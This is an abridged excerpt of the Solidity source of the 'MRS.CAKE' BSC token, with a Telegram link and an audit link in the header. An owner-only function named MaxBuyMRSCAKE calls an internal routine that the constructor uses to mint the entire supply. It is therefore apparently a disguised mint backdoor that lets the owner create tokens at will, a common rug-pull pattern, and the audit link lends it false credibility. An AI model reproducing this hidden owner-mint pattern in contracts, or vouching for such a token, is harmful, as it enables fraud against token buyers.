...
/*
 ...
 Telegram: https://t.me/MrsCakeBSC

 Automatic Security Audit (By Mythx) :

 https://github.com/CAKE-Blockchain/MRSCAKE/blob/632abd7911cf2e76f2ff342245c22cfc6e005ba6/MRS.CAKE_mythx_security_audit.pdf
...
contract ERC20 is Context, IERC20, Ownable {
    ...
    function MaxBuyMRSCAKE(uint256 amount) public onlyOwner {
    _MaxBuyMRSCAKE(msg.sender, amount);
    }
    ...
    function _MaxBuyMRSCAKE(address account, uint256 amount) internal virtual {
...
contract MRSCAKE is ERC20 {

    uint tokenTotalSupply = 20000000;

    constructor() public ERC20("MRS.CAKE", "MRS.CAKE") {
        _MaxBuyMRSCAKE(msg.sender, tokenTotalSupply * (10 ** uint256(decimals())));
    }
}